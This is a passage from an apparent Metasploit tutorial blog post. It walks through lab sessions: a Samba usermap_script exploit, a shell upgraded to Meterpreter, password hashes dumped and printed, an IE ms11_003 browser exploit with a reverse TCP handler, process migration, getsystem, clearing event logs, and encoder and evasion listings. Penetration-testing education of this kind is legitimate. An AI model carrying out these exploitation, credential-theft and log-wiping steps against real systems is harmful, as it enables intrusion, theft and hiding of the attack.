msf exploit(usermap_script) > sessions</p>

<h1>Active sessions</h1>

<p>  Id  Type        Information  Connection</p>

<hr />

<p>  1   shell unix               192.168.80.155:34501 &ndash;> 192.168.80.156:4444 (192.168.80.156)</p>

<p>msf exploit(usermap_script) > sessions -u 1
[*] Executing &lsquo;post/multi/manage/shell_to_meterpreter&rsquo; on session(s): [1]</p>

<p>[<em>] Upgrading session ID: 1
[</em>] Starting exploit/multi/handler
[<em>] Started reverse TCP handler on 192.168.80.155:4433
[</em>] Starting the payload handler&hellip;
[<em>] Transmitting intermediate stager for over-sized stage&hellip;(105 bytes)
[</em>] Sending stage (1495599 bytes) to 192.168.80.156
[<em>] Command stager progress: 100.00% (668/668 bytes)
msf exploit(usermap_script) > [</em>] Meterpreter session 2 opened (192.168.80.155:4433 &ndash;> 192.168.80.156:58435) at 2016-06-02 13:53:36 -0400
```</p>

<ul>
<li><strong>set</strong>, <strong>setg</strong> &ndash; sets value to option (g for global variables). You will do lots of setting as you tweak your exploits :p</li>
</ul>


<p>``` plain
msf > help set
Usage: set [option] [value]</p>

<p>Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.</p>

<p>If run from a module context, this will set the value in the module&rsquo;s
datastore.  Use -g to operate on the global datastore</p>

<p>msf > setg</p>

<h1>Global</h1>

<p>  Name   Value</p>

<hr />

<p>  RHOST  192.168.80.156
```</p>

<ul>
<li><strong>show</strong> &ndash; displays various information as needed</li>
</ul>


<p><code>plain
msf &gt; help show
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
</code></p>

<p>The options that we need to edit when setting up exploits:</p>

<p>``` plain
msf exploit(ms08_067_netapi) > show options</p>

<p>Module options (exploit/windows/smb/ms08_067_netapi):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   RHOST    192.168.80.156   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Targeting
```</p>

<p>A couple of payloads:</p>

<p>``` plain
msf exploit(ms08_067_netapi) > show payloads</p>

<h1>Compatible Payloads</h1>

<p>   Name                                                Disclosure Date  Rank    Description</p>

<hr />

<p>   generic/custom                                                       normal  Custom Payload
   generic/debug_trap                                                   normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                                   normal  Generic x86 Tight Loop
   windows/adduser                                                      normal  Windows Execute net user /ADD
&hellip;
```</p>

<h3>Evasion</h3>

<p>For the evasion options available for each module, you can use the command <strong>show evasion</strong>:</p>

<p>``` plain
msf exploit(advantech_switch_bash_env_exec) > show evasion</p>

<p>Module evasion options:</p>

<p>   Name           : <a href="HTTP::header_folding">HTTP::header_folding</a>
   Current Setting: false
   Description    : Enable folding of HTTP headers</p>

<p>   Name           : <a href="HTTP::method_random_case">HTTP::method_random_case</a>
   Current Setting: false
   Description    : Use random casing for the HTTP method</p>

<p>   Name           : <a href="HTTP::method_random_invalid">HTTP::method_random_invalid</a>
   Current Setting: false
   Description    : Use a random invalid, HTTP method for request
&hellip;
```</p>

<h3>Encoders</h3>

<p>Metasploit automatically selects the best encoder for the job given the selected criteria. If you want to use a specific encoder, you can select one from the multitude available:</p>

<p>``` plain
msf payload(generic) > show encoders</p>

<h1>Encoders</h1>

<p>   Name                          Disclosure Date  Rank       Description</p>

<hr />

<p>   cmd/echo                                       good       Echo Command Encoder
   cmd/generic_sh                                 manual     Generic Shell Variable Substitution Command Encoder
   cmd/ifs                                        low        Generic ${IFS} Substitution Command Encoder
   cmd/perl                                       normal     Perl Command Encoder
   cmd/powershell_base64                          excellent  Powershell Base64 Command Encoder
   cmd/printf_php_mq                              manual     printf(1) via PHP magic_quotes Utility Command Encoder
   generic/eicar                                  manual     The EICAR Encoder
   generic/none                                   normal     The &ldquo;none&rdquo; Encoder
   mipsbe/byte_xori                               normal     Byte XORi Encoder
   mipsbe/longxor                                 normal     XOR Encoder
   mipsle/byte_xori                               normal     Byte XORi Encoder
   mipsle/longxor                                 normal     XOR Encoder
   php/base64                                     great      PHP Base64 Encoder
   ppc/longxor                                    normal     PPC LongXOR Encoder
   ppc/longxor_tag                                normal     PPC LongXOR Encoder
   sparc/longxor_tag                              normal     SPARC DWORD XOR Encoder
   x64/xor                                        normal     XOR Encoder
   x86/add_sub                                    manual     Add/Sub Encoder
   x86/alpha_mixed                                low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                                low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_underscore_tolower                   manual     Avoid underscore/tolower
   x86/avoid_utf8_tolower                         manual     Avoid UTF8/tolower
   x86/bloxor                                     manual     BloXor &ndash; A Metamorphic Block Based XOR Encoder
   x86/call4_dword_xor                            normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                              manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                               manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                               manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                                  normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                                normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                          normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                                   low        Non-Alpha Encoder
   x86/nonupper                                   low        Non-Upper Encoder
   x86/opt_sub                                    manual     Sub Encoder (optimised)
   x86/shikata_ga_nai                             excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                          manual     Single Static Bit
   x86/unicode_mixed                              manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                              manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```</p>

<ul>
<li><strong>spool</strong> &ndash; write console log to a file</li>
</ul>


<p>``` plain
msf > help spool
Usage: spool <off>|<filename></p>

<p>Example:
  spool /tmp/console.log
```</p>

<ul>
<li><strong>use</strong> &ndash; selects module</li>
</ul>


<h1>Payload types</h1>

<p>There are 3 types of payloads that you can use with your exploits.</p>

<ul>
<li><p><strong>singles</strong> are standalone payloads that have everything needed to run by themselves. They are reliable but their size might be a detriment with some exploits</p></li>
<li><p><strong>stagers</strong> are small and are designed to establish a connection between attacker and victim and download additional components for the exploit as needed</p></li>
<li><p><strong>stages</strong> have various functionalities and are downloaded by the stagers to be run on the remote host</p></li>
</ul>


<h2>Payload generation</h2>

<p>The following are the available options for generating payloads:</p>

<p>``` plain
sf payload(generic) > generate -h
Usage: generate [options]</p>

<p>Generates a payload.</p>

<p>OPTIONS:</p>

<pre><code>-E        Force encoding.
-b &lt;opt&gt;  The list of characters to avoid: '\x00\xff'
-e &lt;opt&gt;  The name of the encoder module to use.
-f &lt;opt&gt;  The output file name (otherwise stdout)
-h        Help banner.
-i &lt;opt&gt;  the number of encoding iterations.
-k        Keep the template executable functional
-o &lt;opt&gt;  A comma separated list of options in VAR=VAL format.
-p &lt;opt&gt;  The Platform for output.
-s &lt;opt&gt;  NOP sled length.
-t &lt;opt&gt;  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,psh-cmd,vba,vba-exe,vba-psh,vbs,war
-x &lt;opt&gt;  The executable template to use
</code></pre>

<p>```</p>

<h1>Working with the database</h1>

<p>Metasploit is backed by a powerful database that you can use to organize and classify the information. First, you have to start the PostgreSQL server: <code>service postgresql start</code>. Then you create and initialize the database after starting Metasploit with the <code>msfdb init</code> command.</p>

<p>Let&rsquo;s look at the database commands:</p>

<p>``` plain</p>

<h1>Database Backend Commands</h1>

<pre><code>Command           Description
-------           -----------
creds             List all credentials in the database
db_connect        Connect to an existing database
db_disconnect     Disconnect from the current database instance
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)
db_nmap           Executes nmap and records the output automatically
db_rebuild_cache  Rebuilds the database-stored module cache
db_status         Show the current database status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces
</code></pre>

<p>```</p>

<p>Chances are, you will want to keep your targets organized and separate from each other. For this, you can build different workspaces for every one:</p>

<p>``` plain
msf > help workspace
Usage:</p>

<pre><code>workspace                  List workspaces
workspace [name]           Switch workspace
workspace -a [name] ...    Add workspace(s)
workspace -d [name] ...    Delete workspace(s)
workspace -D               Delete all workspaces
workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
workspace -h               Show this help information
</code></pre>

<p>```</p>

<p>Let&rsquo;s say that you want a separate workspace for your lab target. You can add it and all the subsequent information will be saved in this workspace:</p>

<p><code>plain
msf &gt; workspace -a lab
[*] Added workspace: lab
msf &gt; workspace
  default
* lab
</code></p>

<p>Now let&rsquo;s populate this workspace with some information about the target. I ran a <code>db_nmap</code> scan on the box and then I looked at the hosts data:</p>

<p>``` plain
msf > hosts</p>

<h1>Hosts</h1>

<p>address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments</p>

<hr />

<p>192.168.80.156  00:0c:29:e5:3a:67        Linux               2.6.X  server       <br/>
```</p>

<p>There is more that you can do with the <strong>hosts</strong> command:</p>

<p>``` plain
msf > hosts -h
Usage: hosts [ options ] [addr1 addr2 &hellip;]</p>

<p>OPTIONS:
  -a,&mdash;add          Add the hosts instead of searching
  -d,&mdash;delete       Delete the hosts instead of searching
  -c &lt;col1,col2>    Only show the given columns (see list below)
  -h,&mdash;help         Show this help information
  -u,&mdash;up           Only show hosts which are up
  -o <file>         Send output to a file in csv format
  -R,&mdash;rhosts       Set RHOSTS from the results of the search
  -S,&mdash;search       Search string to filter by
  -i,&mdash;info         Change the info of a host
  -n,&mdash;name         Change the name of a host
  -m,&mdash;comment      Change the comment of a host
  -t,&mdash;tag          Add or specify a tag to a range of hosts</p>

<p>Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```</p>

<p>With the <strong>services</strong> command, you can look at the identified services:</p>

<p>``` plain
msf > services -h</p>

<p>Usage: services [-h] [-u] [-a] [-r <proto>] [-p &lt;port1,port2>] [-s &lt;name1,name2>] [-o <filename>] [addr1 addr2 &hellip;]</p>

<p>  -a,&mdash;add          Add the services instead of searching
  -d,&mdash;delete       Delete the services instead of searching
  -c &lt;col1,col2>    Only show the given columns
  -h,&mdash;help         Show this help information
  -s &lt;name1,name2>  Search for a list of service names
  -p &lt;port1,port2>  Search for a list of ports
  -r <protocol>     Only show [tcp|udp] services
  -u,&mdash;up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -R,&mdash;rhosts       Set RHOSTS from the results of the search
  -S,&mdash;search       Search string to filter by</p>

<p>Available columns: created_at, info, name, port, proto, state, updated_at</p>

<p>msf > services</p>

<h1>Services</h1>

<p>host            port  proto  name         state  info</p>

<hr />

<p>192.168.80.156  21    tcp    ftp          open   ProFTPD 1.3.1
192.168.80.156  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
192.168.80.156  23    tcp    telnet       open   Linux telnetd
192.168.80.156  25    tcp    smtp         open   Postfix smtpd
192.168.80.156  53    tcp    domain       open   ISC BIND 9.4.2
192.168.80.156  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
192.168.80.156  139   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
192.168.80.156  445   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
192.168.80.156  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
192.168.80.156  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 &ndash; 8.3.7
192.168.80.156  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3
192.168.80.156  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
```</p>

<p>You can also look at the vulnerabilities associated with different services:</p>

<p>``` plain
msf > help vulns
Print all vulnerabilities in the database</p>

<p>Usage: vulns [addr range]</p>

<p>  -h,&mdash;help             Show this help information
  -p,&mdash;port <portspec>  List vulns matching this port spec
  -s <svc names>        List vulns matching these service names
  -R,&mdash;rhosts           Set RHOSTS from the results of the search
  -S,&mdash;search           Search string to filter by
  -i,&mdash;info             Display Vuln Info</p>

<p>Examples:
  vulns -p 1-65536          # only vulns with associated services
  vulns -p 1-65536 -s http  # identified as http on any port
```</p>

<p>It&rsquo;s possible to also add notes:</p>

<p>``` plain
msf > help notes
Usage: notes [-h] [-t &lt;type1,type2>] [-n <data string>] [-a] [addr range]</p>

<p>  -a,&mdash;add                  Add a note to the list of addresses, instead of listing
  -d,&mdash;delete               Delete the hosts instead of searching
  -n,&mdash;note <data>          Set the data for a new note (only with -a)
  -t &lt;type1,type2>          Search for a list of types
  -h,&mdash;help                 Show this help information
  -R,&mdash;rhosts               Set RHOSTS from the results of the search
  -S,&mdash;search               Regular expression to match for search
  -o,&mdash;output               Save the notes to a csv file
  &mdash;sort &lt;field1,field2>    Fields to sort by (case sensitive)</p>

<p>Examples:
  notes &mdash;add -t apps -n &lsquo;winzip&rsquo; 10.1.1.34 10.1.20.41
  notes -t smb.fingerprint 10.1.1.34 10.1.20.41
  notes -S &lsquo;nmap.nse.(http|rtsp)&rsquo; &mdash;sort type,output
```</p>

<p>If credentials were found, we have a way to list and manage them:</p>

<p>``` plain
msf > help creds</p>

<p>With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.</p>

<p>Usage &ndash; Listing credentials:
  creds [filter options] [address range]</p>

<p>Usage &ndash; Adding credentials:
  creds add-ntlm <user> <ntlm hash> [domain]
  creds add-password <user> <password> [realm] [realm-type]
  creds add-ssh-key <user> &lt;/path/to/id_rsa> [realm-type]
Where [realm type] can be one of:
  domain &ndash; Active Directory Domain
  db2db &ndash; DB2 Database
  sid &ndash; Oracle System Identifier
  pgdb &ndash; PostgreSQL Database
  wildcard &ndash; *</p>

<p>General options
  -h,&mdash;help             Show this help information
  -o <file>             Send output to a file in csv format
  -d                    Delete one or more credentials</p>

<p>Filter options for listing
  -P,&mdash;password <regex> List passwords that match this regex
  -p,&mdash;port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,&mdash;user <regex>     List users that match this regex
  -t,&mdash;type <type>      List creds that match the following types: password,ntlm,hash
  -O,&mdash;origins          List creds that match these origins
  -R,&mdash;rhosts           Set RHOSTS from the results of the search</p>

<p>Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # nmap host specification
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t ntlm       # All NTLM creds</p>

<p>Examples, adding:
  # Add a user with an NTLMHash
  creds add-ntlm alice 5cfe4c82d9ab8c66590f5b47cd6690f1:978a2e2e1dec9804c6b936f254727f9a
  # Add a user with a blank password and a domain
  creds add-password bob &lsquo;&rsquo; contosso
  # Add a user with an SSH key
  creds add-ssh-key root /root/.ssh/id_rsa</p>

<p>Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```</p>

<p>As you can see though, I have no credentials in the database:</p>

<p>``` plain
msf > creds</p>

<h1>Credentials</h1>

<p>host  origin  service  public  private  realm  private_type</p>

<hr />

<p>```</p>

<p>Finally, there is the loot:</p>

<p>``` plain
msf > help loot
Usage: loot <options>
 Info: loot [-h] [addr1 addr2 &hellip;] [-t &lt;type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 &hellip;] [-t [type]
  Del: loot -d [addr1 addr2 &hellip;]</p>

<p>  -a,&mdash;add          Add loot to the list of addresses, instead of listing
  -d,&mdash;delete       Delete <em>all</em> loot matching host and type
  -f,&mdash;file         File with contents of the loot to add
  -i,&mdash;info         Info of the loot to add
  -t &lt;type1,type2>  Search for a list of types
  -h,&mdash;help         Show this help information
  -S,&mdash;search       Search string to filter by
```</p>

<p>I have compromised the target via the Samba service and now I will loot some hashes from it:</p>

<p>``` plain
msf exploit(usermap_script) > run -j
[*] Exploit running as background job.</p>

<p>[<em>] Started bind handler
msf exploit(usermap_script) > [</em>] Command shell session 2 opened (192.168.80.155:49009 &ndash;> 192.168.80.156:4444) at 2016-06-03 13:19:48 -0400</p>

<p>msf exploit(usermap_script) > use post/linux/gather/hashdump
msf post(hashdump) > options</p>

<p>Module options (post/linux/gather/hashdump):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   SESSION                   yes       The session to run this module on.</p>

<p>msf post(hashdump) > sessions</p>

<h1>Active sessions</h1>

<p>  Id  Type        Information  Connection</p>

<hr />

<p>  2   shell unix               192.168.80.155:49009 &ndash;> 192.168.80.156:4444 (192.168.80.156)</p>

<p>msf post(hashdump) > set SESSION 2
SESSION => 2
msf post(hashdump) > run</p>

<p>[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
[+] Unshadowed Password File: /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
[*] Post module execution completed
```</p>

<p>Now I can see the loot in the database:</p>

<p>``` plain
msf post(hashdump) > loot</p>

<h1>Loot</h1>

<p>host            service  type          name                   content     info                            path</p>

<hr />

<p>192.168.80.156           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
192.168.80.156           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.passwd_153460.txt
192.168.80.156           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.shadow_842643.txt
```</p>

<h1>Meterpreter</h1>

<p>Next, let&rsquo;s look at Meterpreter, the king of payloads. Meterpreter has no disk presence because it only exists in memory, and it leaves no trail behind of created processes because it injects itself in currently running processes. To top it off, its traffic is encrypted. I will show Meterpreter in action here, but this time, the target is a Windows 7 machine.</p>

<p>I&rsquo;ve already set up the exploit:</p>

<p>``` plain
msf exploit(ms11_003_ie_css_import) > options</p>

<p>Module options (exploit/windows/browser/ms11_003_ie_css_import):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   OBFUSCATE  true             no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)</p>

<p>Payload options (windows/meterpreter/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic
```</p>

<p>And the description of what this exploit does:</p>

<p><code>plain
Description:
  This module exploits a memory corruption vulnerability within
  Microsoft\'s HTML engine (mshtml). When parsing an HTML page
  containing a recursive CSS import, a C++ object is deleted and later
  reused. This leads to arbitrary code execution. This exploit
  utilizes a combination of heap spraying and the .NET 2.0
  'mscorie.dll' module to bypass DEP and ASLR. This module does not
  opt-in to ASLR. As such, this module should be reliable on all
  Windows versions with .NET 2.0.50727 installed.
</code></p>

<p>All right, first I start the handler on my attacking machine:</p>

<p>``` plain
msf exploit(ms11_003_ie_css_import) > run -j
[*] Exploit running as background job.</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:4444
[</em>] Using URL: <a href="http://0.0.0.0:8080/Br8CNFRY">http://0.0.0.0:8080/Br8CNFRY</a>
msf exploit(ms11_003_ie_css_import) > [<em>] Local IP: <a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a>
[</em>] Server started.
```</p>

<p>Then on the victim, I disabled WIndows Firewall and then I used Internet Explorer (ugh) to go to the URL <code><a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a></code>. And on my Kali machine, a Meterpreter session was opened:</p>

<p><code>plain
msf exploit(ms11_003_ie_css_import) &gt; [*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending redirect
[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/RHHy0H.html"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending HTML
[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/generic-1465040907.dll"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending .NET DLL
[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A"
[*] 192.168.80.128   ms11_003_ie_css_import - Sending CSS
[*] Sending stage (957487 bytes) to 192.168.80.128
[*] Meterpreter session 5 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49281) at 2016-06-04 07:48:33 -0400
[*] Session ID 5 (192.168.80.155:4444 -&gt; 192.168.80.128:49281) processing InitialAutoRunScript 'migrate -f'
[*] Current server process: iexplore.exe (2772)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 988
[+] Successfully migrated to process
</code></p>

<p>I actually closed IE on the Windows machine because it kept requesting the DLL and opening more sessions. Now it&rsquo;s time to go to the newly created Meterpreter session:</p>

<p>``` plain
msf exploit(ms11_003_ie_css_import) > sessions</p>

<h1>Active sessions</h1>

<p>  Id  Type                   Information                                Connection</p>

<hr />

<p>  5   meterpreter x86/win32  WIN-D7GA2J1M0TU\wingoat @ WIN-D7GA2J1M0TU  192.168.80.155:4444 &ndash;> 192.168.80.128:49281 (192.168.80.128)</p>

<p>msf exploit(ms11_003_ie_css_import) > sessions -i 5
[*] Starting interaction with 5&hellip;
```</p>

<p>The reason I wanted to show Meterpreter on a Windows target is because there are many commands unique to Windows that we can use. I will demo them further</p>

<h2>Meterpreter commands</h2>

<p>``` plain
meterpreter > ?</p>

<h1>Core Commands</h1>

<pre><code>Command                   Description
-------                   -----------
?                         Help menu
background                Backgrounds the current session
bgkill                    Kills a background meterpreter script
bglist                    Lists running background scripts
bgrun                     Executes a meterpreter script as a background thread
channel                   Displays information or control active channels
close                     Closes a channel
disable_unicode_encoding  Disables encoding of unicode strings
enable_unicode_encoding   Enables encoding of unicode strings
exit                      Terminate the meterpreter session
get_timeouts              Get the current session timeout values
help                      Help menu
info                      Displays information about a Post module
irb                       Drop into irb scripting mode
load                      Load one or more meterpreter extensions
machine_id                Get the MSF ID of the machine attached to the session
migrate                   Migrate the server to another process
quit                      Terminate the meterpreter session
read                      Reads data from a channel
resource                  Run the commands stored in a file
run                       Executes a meterpreter script or Post module
set_timeouts              Set the current session timeout values
sleep                     Force Meterpreter to go quiet, then re-establish session.
transport                 Change the current transport mechanism
use                       Deprecated alias for 'load'
uuid                      Get the UUID for the current session
write                     Writes data to a channel
</code></pre>

<h1>Stdapi: File system Commands</h1>

<pre><code>Command       Description
-------       -----------
cat           Read the contents of a file to the screen
cd            Change directory
download      Download a file or directory
edit          Edit a file
getlwd        Print local working directory
getwd         Print working directory
lcd           Change local working directory
lpwd          Print local working directory
ls            List files
mkdir         Make directory
mv            Move source to destination
pwd           Print working directory
rm            Delete the specified file
rmdir         Remove directory
search        Search for files
show_mount    List all mount points/logical drives
upload        Upload a file or directory
</code></pre>

<h1>Stdapi: Networking Commands</h1>

<pre><code>Command       Description
-------       -----------
arp           Display the host ARP cache
getproxy      Display the current proxy configuration
ifconfig      Display interfaces
ipconfig      Display interfaces
netstat       Display the network connections
portfwd       Forward a local port to a remote service
route         View and modify the routing table
</code></pre>

<h1>Stdapi: System Commands</h1>

<pre><code>Command       Description
-------       -----------
clearev       Clear the event log
drop_token    Relinquishes any active impersonation token.
execute       Execute a command
getenv        Get one or more environment variable values
getpid        Get the current process identifier
getprivs      Attempt to enable all privileges available to the current process
getsid        Get the SID of the user that the server is running as
getuid        Get the user that the server is running as
kill          Terminate a process
ps            List running processes
reboot        Reboots the remote computer
reg           Modify and interact with the remote registry
rev2self      Calls RevertToSelf() on the remote machine
shell         Drop into a system command shell
shutdown      Shuts down the remote computer
steal_token   Attempts to steal an impersonation token from the target process
suspend       Suspends or resumes a list of processes
sysinfo       Gets information about the remote system, such as OS
</code></pre>

<h1>Stdapi: User interface Commands</h1>

<pre><code>Command        Description
-------        -----------
enumdesktops   List all accessible desktops and window stations
getdesktop     Get the current meterpreter desktop
idletime       Returns the number of seconds the remote user has been idle
keyscan_dump   Dump the keystroke buffer
keyscan_start  Start capturing keystrokes
keyscan_stop   Stop capturing keystrokes
screenshot     Grab a screenshot of the interactive desktop
setdesktop     Change the meterpreters current desktop
uictl          Control some of the user interface components
</code></pre>

<h1>Stdapi: Webcam Commands</h1>

<pre><code>Command        Description
-------        -----------
record_mic     Record audio from the default microphone for X seconds
webcam_chat    Start a video chat
webcam_list    List webcams
webcam_snap    Take a snapshot from the specified webcam
webcam_stream  Play a video stream from the specified webcam
</code></pre>

<h1>Priv: Elevate Commands</h1>

<pre><code>Command       Description
-------       -----------
getsystem     Attempt to elevate your privilege to that of local system.
</code></pre>

<h1>Priv: Password database Commands</h1>

<pre><code>Command       Description
-------       -----------
hashdump      Dumps the contents of the SAM database
</code></pre>

<h1>Priv: Timestomp Commands</h1>

<pre><code>Command       Description
-------       -----------
timestomp     Manipulate file MACE attributes
</code></pre>

<p>```</p>

<p>The first thing I will do is migrate to the Windows Explorer process, because a stray Notepad might look suspicious. I got the PID from doing a <em>ps</em>:</p>

<p><code>plain
meterpreter &gt; migrate 1408
[*] Migrating from 988 to 1408...
[*] Migration completed successfully.
meterpreter &gt; getpid
Current pid: 1408
</code></p>

<p>So let&rsquo;s now play with the available functionality. I made a file that I will upload to the hacked machine:</p>

<p>``` plain
meterpreter > background
[<em>] Backgrounding session 5&hellip;
msf exploit(ms11_003_ie_css_import) > echo &lsquo;HA HA HA&rsquo; > read.txt
[</em>] exec: echo &lsquo;HA HA HA&rsquo; > read.txt</p>

<p>meterpreter > upload /root/read.txt C:\
[<em>] uploading  : /root/read.txt &ndash;> C:\
[</em>] uploaded   : /root/read.txt &ndash;> C:\read.txt
meterpreter > cd C:\
meterpreter > cat read.txt
HA HA HA
```</p>

<p>Ok, now I will download something on my machine:</p>

<p><code>plain
meterpreter &gt; download desktop.ini
[*] downloading: desktop.ini -&gt; desktop.ini
[*] download   : desktop.ini -&gt; desktop.ini
meterpreter &gt; cat desktop.ini
��
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
</code></p>

<p>Let&rsquo;s now look at some system information:</p>

<p><code>plain
meterpreter &gt; sysinfo
Computer        : WIN-D7GA2J1M0TU
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/win64
</code></p>

<p>I attempted to get system privileges and it worked:</p>

<p><code>plain
meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></p>

<p>It&rsquo;s possible to clear the event log of the machine, though that is anything but stealthy:</p>

<p><code>plain
meterpreter &gt; clearev
[*] Wiping 1583 records from Application...
[*] Wiping 5436 records from System...
[*] Wiping 1422 records from Security...
</code></p>

<p>We can also execute native commands on the target:</p>

<p>``` plain
meterpreter > execute -h
Usage: execute -f file [options]</p>

<p>Executes a command on the remote machine.</p>

<p>OPTIONS:</p>

<pre><code>-H        Create the process hidden from view.
-a &lt;opt&gt;  The arguments to pass to the command.
-c        Channelized I/O (required for interaction).
-d &lt;opt&gt;  The 'dummy' executable to launch when using -m.
-f &lt;opt&gt;  The executable command to run.
-h        Help menu.
-i        Interact with the process after creating it.
-k        Execute process on the meterpreters current desktop
-m        Execute from memory.
-s &lt;opt&gt;  Execute process in a given session as the session user
-t        Execute process with currently impersonated thread token
</code></pre>

<p>meterpreter > execute -f &ldquo;ipconfig /flushdns&rdquo; -i -H
Process 2016 created.
Channel 3 created.</p>

<p>Windows IP Configuration</p>

